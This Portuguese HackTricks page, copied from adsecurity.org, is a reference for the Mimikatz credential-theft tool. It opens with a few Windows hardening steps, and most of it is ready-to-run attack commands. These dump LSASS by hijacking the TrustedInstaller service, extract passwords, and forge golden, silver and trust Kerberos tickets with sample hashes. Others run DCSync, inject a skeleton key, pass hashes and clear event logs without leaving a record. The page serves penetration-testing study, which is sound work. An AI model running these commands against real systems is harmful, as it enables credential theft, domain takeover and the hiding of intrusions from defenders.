# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

O conteúdo desta página foi copiado do [adsecurity.org](https://adsecurity.org/?page\_id=1821)

## LM e Clear-Text na memória

A partir do Windows 8.1 e do Windows Server 2012 R2, o hash LM e a senha "clear-text" não estão mais na memória.

Para evitar que a senha "clear-text" seja colocada no LSASS, a seguinte chave do registro precisa ser definida como "0" (Digest Disabled):

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz & Proteção LSA:**

O Windows Server 2012 R2 e o Windows 8.1 incluem um novo recurso chamado Proteção LSA, que envolve a habilitação do [LSASS como um processo protegido no Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz pode ignorar com um driver, mas isso deve fazer algum barulho nos logs de eventos):

_O LSA, que inclui o processo Local Security Authority Server Service (LSASS), valida usuários para logins locais e remotos e aplica políticas de segurança locais. O sistema operacional Windows 8.1 fornece proteção adicional para o LSA para evitar a leitura de memória e a injeção de código por processos não protegidos. Isso fornece segurança adicional para as credenciais que o LSA armazena e gerencia._

Habilitando a proteção LSA:

1. Abra o Editor do Registro (RegEdit.exe) e navegue até a chave do registro localizada em: HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa e defina o valor da chave do registro como: "RunAsPPL"=dword:00000001.
2. Crie uma nova GPO e navegue até Configuração do Computador, Preferências, Configurações do Windows. Clique com o botão direito em Registro, aponte para Novo e clique em Item de Registro. A caixa de diálogo Novas Propriedades do Registro aparece. Na lista Hive, clique em HKEY\_LOCAL\_MACHINE. Na lista Caminho da Chave, navegue até SYSTEM\CurrentControlSet\Control\Lsa. Na caixa Nome do Valor, digite RunAsPPL. Na caixa Tipo de Valor, clique no REG\_DWORD. Na caixa Dados do Valor, digite 00000001. Clique em OK.

A proteção LSA impede que processos não protegidos interajam com o LSASS. Mimikatz ainda pode ignorar isso com um driver ("!+").

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### Ignorando SeDebugPrivilege Desativado
Por padrão, o SeDebugPrivilege é concedido ao grupo Administradores por meio da Política de Segurança Local. Em um ambiente do Active Directory, [é possível remover esse privilégio](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) definindo Configuração do Computador --> Políticas --> Configurações do Windows --> Configurações de Segurança --> Direitos de Usuário --> Depurar programas definidos como um grupo vazio. Mesmo em dispositivos desconectados do AD, essa configuração não pode ser sobrescrita e os Administradores Locais receberão um erro ao tentar despejar a memória ou usar o Mimikatz.

No entanto, a conta TrustedInstaller ainda terá acesso para despejar a memória e [pode ser usada para ignorar essa defesa](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). Modificando a configuração do serviço TrustedInstaller, a conta pode ser executada para usar o ProcDump e despejar a memória para `lsass.exe`.
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

Este arquivo de despejo pode ser exfiltrado para um computador controlado pelo atacante, onde as credenciais podem ser extraídas. ]
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Principal

### **EVENTO**

**EVENTO::Limpar** – Limpa um log de eventos\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENTO:::Drop** – (_**experimental**_) Patch do serviço de eventos para evitar novos eventos

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

Nota:\
Execute privilege::debug e depois event::drop para corrigir o log de eventos. Em seguida, execute Event::Clear para limpar o log de eventos sem que nenhum evento de log apagado (1102) seja registrado.

### KERBEROS

#### Golden Ticket

Um Golden Ticket é um TGT usando o hash de senha NTLM do KRBTGT para criptografar e assinar.

Um Golden Ticket (GT) pode ser criado para se passar por qualquer usuário (real ou imaginário) no domínio como membro de qualquer grupo no domínio (fornecendo uma quantidade virtualmente ilimitada de direitos) para qualquer e todos os recursos no domínio.

**Referência de comando Mimikatz Golden Ticket:**

O comando Mimikatz para criar um Golden Ticket é "kerberos::golden"

* /domain – o nome de domínio totalmente qualificado. Neste exemplo: "lab.adsecurity.org".
* /sid – o SID do domínio. Neste exemplo: "S-1-5-21-1473643419-774954089-2222329127".
* /sids – SIDs adicionais para contas/grupos na floresta AD com direitos que você deseja falsificar. Normalmente, este será o grupo Enterprise Admins para o domínio raiz "S-1-5-21-1473643419-774954089-5872329127-519". Este parâmetro adiciona os SIDs fornecidos ao parâmetro de Histórico de SID.](https://adsecurity.org/?p=1640)
* /user – nome de usuário para se passar por
* /groups (opcional) – RIDs de grupo dos quais o usuário é membro (o primeiro é o grupo primário).\
  Adicione RIDs de contas de usuário ou computador para receber o mesmo acesso.\
  Grupos padrão: 513,512,520,518,519 para os grupos de Administradores conhecidos (listados abaixo).
* /krbtgt – hash de senha NTLM para a conta de serviço KDC do domínio (KRBTGT). Usado para criptografar e assinar o TGT.
* /ticket (opcional) – forneça um caminho e nome para salvar o arquivo Golden Ticket para uso posterior ou use /ptt para injetar imediatamente o Golden Ticket na memória para uso.
* /ptt – como alternativa a /ticket – use isso para injetar imediatamente o ticket forjado na memória para uso.
* /id (opcional) – RID do usuário. O padrão do Mimikatz é 500 (o RID da conta de Administrador padrão).
* /startoffset (opcional) – o deslocamento de início quando o ticket está disponível (geralmente definido como -10 ou 0 se esta opção for usada). O valor padrão do Mimikatz é 0.
* /endin (opcional) – tempo de vida do ticket. O valor padrão do Mimikatz é de 10 anos (~5.262.480 minutos). A configuração de política Kerberos padrão do Active Directory é de 10 horas (600 minutos).
* /renewmax (opcional) – tempo de vida máximo do ticket com renovação. O valor padrão do Mimikatz é de 10 anos (~5.262.480 minutos). A configuração de política Kerberos padrão do Active Directory é de 7 dias (10.080 minutos).
* /sids (opcional) – definido como o SID do grupo Enterprise Admins na floresta AD ([ADRootDomainSID]-519) para falsificar os direitos de administrador da empresa em toda a floresta AD (administrador AD em todos os domínios na floresta AD).
* /aes128 – a chave AES128
* /aes256 – a chave AES256

Grupos padrão do Golden Ticket:

* SID de usuários do domínio: S-1-5-21\<DOMAINID>-513
* SID de administradores do domínio: S-1-5-21\<DOMAINID>-512
* SID de administradores de esquema: S-1-5-21\<DOMAINID>-518
* SID de administradores da empresa: S-1-5-21\<DOMAINID>-519 (isso só é eficaz quando o ticket forjado é criado no domínio raiz da floresta, embora seja adicionado usando o parâmetro /sids para direitos de administrador da floresta AD)
* SID de proprietários do criador de política de grupo: S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[Golden tickets em diferentes domínios](https://adsecurity.org/?p=1640)

#### Silver Ticket

Um Silver Ticket é um TGS (semelhante ao TGT em formato) que usa o hash de senha NTLM da conta de serviço de destino (identificada pelo mapeamento SPN) para criptografar e assinar.

**Exemplo de comando Mimikatz para criar um Silver Ticket:**

O seguinte comando Mimikatz cria um Silver Ticket para o serviço CIFS no servidor adsmswin2k8r2.lab.adsecurity.org. Para que este Silver Ticket seja criado com sucesso, o hash de senha da conta de computador AD para adsmswin2k8r2.lab.adsecurity.org precisa ser descoberto, seja a partir de um dump de domínio AD ou executando o Mimikatz no sistema local, como mostrado acima (_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_). O hash de senha NTLM é usado com o parâmetro /rc4. O tipo de SPN de serviço também precisa ser identificado no parâmetro /service. Finalmente, o nome de domínio totalmente qualificado do computador de destino precisa ser fornecido no parâmetro /target. Não se esqueça do SID do domínio no parâmetro /sid.
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Trust Ticket**](https://adsecurity.org/?p=1588)

Uma vez que o hash da senha de confiança do Active Directory é determinado, um trust ticket pode ser gerado. Os trust tickets são criados usando a senha compartilhada entre 2 Domínios que confiam um no outro.\
[Mais informações sobre Trust Tickets.](https://adsecurity.org/?p=1588)

**Extraindo senhas de confiança (trust keys)**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Criar um ticket de confiança forjado (TGT inter-realm) usando o Mimikatz**

Forje o ticket de confiança que afirma que o detentor do ticket é um Administrador Empresarial na Floresta AD (alavancando o SIDHistory, "sids", através de confianças no Mimikatz, minha "contribuição" para o Mimikatz). Isso permite acesso administrativo completo de um domínio filho para o domínio pai. Observe que essa conta não precisa existir em nenhum lugar, pois é efetivamente um Golden Ticket através da confiança.
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
Parâmetros específicos necessários para o Trust Ticket:

* \*\*/\*\*target – o FQDN do domínio de destino.
* \*\*/\*\*service – o serviço Kerberos em execução no domínio de destino (krbtgt).
* \*\*/\*\*rc4 – o hash NTLM para a conta de serviço do serviço Kerberos (krbtgt).
* \*\*/\*\*ticket – forneça um caminho e nome para salvar o arquivo de ticket forjado para uso posterior ou use /ptt para injetar imediatamente o ticket dourado na memória para uso.

#### **Mais sobre KERBEROS**

**KERBEROS::List** – Lista todos os tickets de usuário (TGT e TGS) na memória do usuário. Não são necessários privilégios especiais, pois ele exibe apenas os tickets do usuário atual.\
Semelhante à funcionalidade de "klist".

**KERBEROS::PTC** – pass the cache (NT6)\
Sistemas *Nix como Mac OS, Linux, BSD, Unix, etc. armazenam em cache as credenciais Kerberos. Esses dados em cache podem ser copiados e passados usando o Mimikatz. Também é útil para injetar tickets Kerberos em arquivos ccache.

Um bom exemplo do kerberos::ptc do Mimikatz é quando [explorando o MS14-068 com PyKEK](https://adsecurity.org/?p=676). O PyKEK gera um arquivo ccache que pode ser injetado com o Mimikatz usando kerberos::ptc.

[![Mimikatz-PTC-PyKEK-ccacheFile](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)

**KERBEROS::PTT** – pass the ticket\
Depois que um [ticket Kerberos é encontrado](https://adsecurity.org/?p=1667), ele pode ser copiado para outro sistema e passado para a sessão atual, simulando efetivamente um logon sem qualquer comunicação com o Controlador de Domínio. Não são necessários direitos especiais.\
Semelhante a SEKURLSA::PTH (Pass-The-Hash).

* /filename – o nome do arquivo do ticket (pode ser múltiplo)
* /diretory – um caminho de diretório, todos os arquivos .kirbi dentro serão injetados.

[![KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)

**KERBEROS::Purge** – apaga todos os tickets Kerberos\
Semelhante à funcionalidade de "klist purge". Execute este comando antes de passar tickets (PTC, PTT, etc.) para garantir que o contexto do usuário correto seja usado.

[![Mimikatz-Kerberos-Purge](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)

**KERBEROS::TGT** – obter o TGT atual para o usuário atual.

[![Mimikatz-Kerberos-TGT](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)

### LSADUMP

**LSADUMP**::**DCShadow** – Define a máquina atual como DC para ter a capacidade de criar novos objetos dentro do DC (método persistente).\
Isso requer direitos de administração completo do AD ou hash de senha KRBTGT.\
O DCShadow define temporariamente o computador como "DC" para fins de replicação:

* Cria 2 objetos na partição de configuração da floresta AD.
* Atualiza o SPN do computador usado para incluir "GC" (Catálogo Global) e "E3514235-4B06-11D1-AB04-00C04FC2DCD2" (Replicação AD). Mais informações sobre os nomes principais de serviço Kerberos na seção [ADSecurity SPN](https://adsecurity.org/?page\_id=183).
* Empurra as atualizações para DCs via DrsReplicaAdd e KCC.
* Remove os objetos criados da partição de configuração.

**LSADUMP::DCSync** – pede a um DC para sincronizar um objeto (obter dados de senha para a conta)\
[Requer associação ao Administrador de Domínio, Administradores de Domínio ou delegação personalizada.](https://adsecurity.org/?p=1729)

Um recurso importante adicionado ao Mimkatz em agosto de 2015 é o "DCSync", que efetivamente "impersonifica" um Controlador de Domínio e solicita dados de senha da conta do Controlador de Domínio de destino.

**Opções do DCSync:**

* /all – DCSync puxa dados para todo o domínio.
* /user – ID do usuário ou SID do usuário para o qual você deseja puxar os dados.
* /domain (opcional) – FQDN do domínio Active Directory. O Mimikatz descobrirá um DC no domínio para se conectar. Se este parâmetro não for fornecido, o Mimikatz usará o domínio atual.
* /csv – exportar para csv
* /dc (opcional) – Especifique o Controlador de Domínio ao qual o DCSync deve se conectar e coletar dados.

Também há um parâmetro /guid.

**Exemplos de comando DCSync:**

Puxar dados de senha para a conta de usuário KRBTGT no domínio rd.adsecurity.org:\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_

Puxar dados de senha para a conta de usuário Administrador no domínio rd.adsecurity.org:\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit_

Puxar dados de senha para a conta de computador do Controlador de Domínio ADSDC03 no domínio lab.adsecurity.org:\
_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_

**LSADUMP::LSA** – Pergunte ao servidor LSA para recuperar SAM/AD enterprise (normal, patch on the fly ou inject). Use /patch para um subconjunto de dados, use /inject para tudo. _Requer direitos de sistema ou depuração._

* /inject – Injeta LSASS para extrair credenciais
* /name – nome da conta para a conta de usuário de destino
* /id – RID para a conta de usuário de destino
* /patch – patch LSASS.

Com frequência, as contas de serviço são membros de Administradores de Domínio (ou equivalentes) ou um Administrador de Domínio foi conectado recentemente ao computador de onde um invasor pode extrair credenciais. Usando essas credenciais, um invasor pode obter acesso a um Controlador de Domínio e obter todas as credenciais do domínio, incluindo o hash NTLM da conta KRBTGT, que é usado para criar Tickets Kerberos Dourados.
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync fornece uma maneira simples de usar os dados de senha da conta de computador DC para se passar por um Controlador de Domínio via um Silver Ticket e DCSync as informações da conta de destino, incluindo os dados de senha.

**LSADUMP::SAM** - obtenha o SysKey para descriptografar as entradas SAM (do registro ou hive). A opção SAM se conecta ao banco de dados local do Gerenciador de Contas de Segurança (SAM) e despeja credenciais para contas locais.

**LSADUMP::Secrets** - obtenha o SysKey para descriptografar as entradas SECRETS (do registro ou hives).

**LSADUMP::SetNTLM** - Peça a um servidor para definir uma nova senha/ntlm para um usuário.

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - Peça ao servidor LSA para recuperar as informações de autenticação de confiança (normal ou patch on the fly).

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - Injete a Chave Esqueleto no processo LSASS no Controlador de Domínio.
```
"privilege::debug" "misc::skeleton"
```
### PRIVILÉGIO

**PRIVILEGE::Backup** – obter privilégios/direitos de backup. Requer direitos de depuração.

**PRIVILEGE::Debug** – obter direitos de depuração (isso ou direitos do sistema local são necessários para muitos comandos do Mimikatz).

### SEKURLSA

**SEKURLSA::Credman** – lista o Gerenciador de Credenciais

**SEKURLSA::Ekeys** – lista as chaves de criptografia Kerberos

**SEKURLSA::Kerberos** – lista as credenciais Kerberos para todos os usuários autenticados (incluindo serviços e contas de computador)

**SEKURLSA::Krbtgt** – obter dados de senha da conta de serviço Kerberos do domínio (KRBTGT)

**SEKURLSA::SSP** – lista as credenciais SSP

**SEKURLSA::Wdigest** – lista as credenciais WDigest

**SEKURLSA::LogonPasswords** – lista todas as credenciais de provedores disponíveis. Isso geralmente mostra as credenciais do usuário e do computador que fizeram login recentemente.

* Despeja dados de senha em LSASS para contas que estão atualmente logadas (ou que fizeram login recentemente), bem como serviços em execução sob o contexto de credenciais de usuário.
* As senhas da conta são armazenadas na memória de maneira reversível. Se elas estiverem na memória (antes do Windows 8.1/Windows Server 2012 R2, elas estavam), elas serão exibidas. O Windows 8.1/Windows Server 2012 R2 não armazena a senha da conta dessa maneira na maioria dos casos. O KB2871997 "retrocede" essa capacidade de segurança para o Windows 7, Windows 8, Windows Server 2008R2 e Windows Server 2012, embora o computador precise de configuração adicional após a aplicação do KB2871997.
* Requer acesso de administrador (com direitos de depuração) ou direitos do sistema local

**SEKURLSA::Minidump** – alterna para o contexto do processo de despejo LSASS (ler despejo lsass)

**SEKURLSA::Pth** – Pass-the-Hash e Over-Pass-the-Hash (também conhecido como pass the key).

_O Mimikatz pode executar a operação bem conhecida 'Pass-The-Hash' para executar um processo sob outras credenciais com o hash NTLM da senha do usuário, em vez de sua senha real. Para isso, ele inicia um processo com uma identidade falsa e, em seguida, substitui as informações falsas (hash NTLM da senha falsa) por informações reais (hash NTLM da senha real)._

* /user – o nome de usuário que você deseja se passar, lembre-se de que Administrador não é o único nome para essa conta bem conhecida.
* /domain – o nome de domínio totalmente qualificado - sem domínio ou, no caso de usuário/administrador local, use o nome do computador ou servidor, grupo de trabalho ou o que for.
* /rc4 ou /ntlm – opcional – a chave RC4 / hash NTLM da senha do usuário.
* /run – opcional – a linha de comando a ser executada – o padrão é: cmd para ter um shell.

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – lista todos os tickets Kerberos disponíveis para todos os usuários autenticados recentemente, incluindo serviços em execução sob o contexto de uma conta de usuário e a conta de computador AD local.\
Ao contrário de kerberos::list, sekurlsa usa leitura de memória e não está sujeito a restrições de exportação de chave. sekurlsa pode acessar tickets de outras sessões (usuários).

* /export – opcional – os tickets são exportados em arquivos .kirbi. Eles começam com o LUID do usuário e o número do grupo (0 = TGS, 1 = ticket do cliente(?) e 2 = TGT)

Semelhante ao despejo de credenciais do LSASS, usando o módulo sekurlsa, um invasor pode obter todos os dados de ticket Kerberos na memória de um sistema, incluindo aqueles pertencentes a um administrador ou serviço.\
Isso é extremamente útil se um invasor tiver comprometido um servidor web configurado para delegação Kerberos que os usuários acessam com um servidor SQL de backend. Isso permite que um invasor capture e reutilize todos os tickets de usuário na memória desse servidor.

O comando "kerberos::tickets" do mimikatz despeja os tickets Kerberos do usuário atualmente logado e não requer direitos elevados. Aproveitando a capacidade do módulo sekurlsa de ler da memória protegida (LSASS), todos os tickets Kerberos no sistema podem ser despejados.

Comando: _mimikatz sekurlsa::tickets exit_

* Despeja todos os tickets Kerberos autenticados em um sistema.
* Requer acesso de administrador (com depuração) ou direitos do sistema local

### **SID**

O módulo SID do Mimikatz substitui MISC::AddSID. Use SID::Patch para corrigir o serviço ntds.

**SID::add** – Adiciona um SID ao SIDHistory de um objeto

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – Modifica o SID do objeto de um objeto

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

O módulo Token do Mimikatz permite que o Mimikatz interaja com tokens de autenticação do Windows, incluindo a captura e a simulação de tokens existentes.

**TOKEN::Elevate** – simula um token. Usado para elevar permissões para o SYSTEM (padrão) ou encontrar um token de administrador de domínio na caixa usando a API do Windows.\
_ Requer direitos de administrador._

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

Encontre uma credencial de administrador de domínio na caixa e use esse token: _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – lista todos os tokens do sistema

### **TS**

**TS::MultiRDP** – (experimental) Corrige o serviço Terminal Server para permitir vários usuários

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – Lista as sessões TS/RDP.

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - Obter senhas de tarefas agendadas

\
